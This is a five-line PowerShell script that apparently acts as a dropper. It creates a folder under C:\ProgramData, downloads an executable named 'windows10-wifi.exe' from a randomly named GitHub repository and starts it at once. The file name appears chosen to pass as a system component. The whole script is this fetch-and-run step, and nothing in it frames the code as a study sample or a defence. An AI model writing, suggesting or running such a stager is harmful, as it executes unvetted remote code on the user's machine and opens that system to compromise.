mkdir C:\ProgramData\zDATAxD
$source = "https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/windows10-wifi.exe"
$destination = "C:\ProgramData\zDATAxD\windows10-wifi.exe"
Invoke-WebRequest -Uri $source -OutFile $destination
start C:\ProgramData\zDATAxD\windows10-wifi.exe
